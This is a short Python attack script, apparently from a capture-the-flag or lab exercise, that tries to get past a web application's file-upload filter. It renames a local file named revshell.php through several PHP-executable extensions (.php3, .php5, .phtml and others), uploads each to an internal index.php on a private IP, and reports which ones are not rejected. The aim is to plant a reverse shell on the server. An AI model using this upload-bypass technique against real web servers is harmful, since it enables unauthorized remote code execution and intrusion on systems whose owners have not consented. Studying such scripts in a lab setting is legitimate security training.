import requests
import os
ip = "10.10.10.30"

url = f"http://{ip}:3333/internal/index.php"

filename = "revshell"
old_file_name = "revshell.php"
extensions = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml"
]

for ext in extensions:
    file = filename + ext
    os.rename(f"../exploits/{old_file_name}", f"../exploits/{file}")

    files = {"file": open(f"../exploits/{file}", "rb")}
    r = requests.post(url, files=files)

    if "Extension not allowed" in r.text:
        print(f"{ext} is not allowed.")
    else:
        print(f"{ext} is possibly allowed.")
    
    old_file_name = file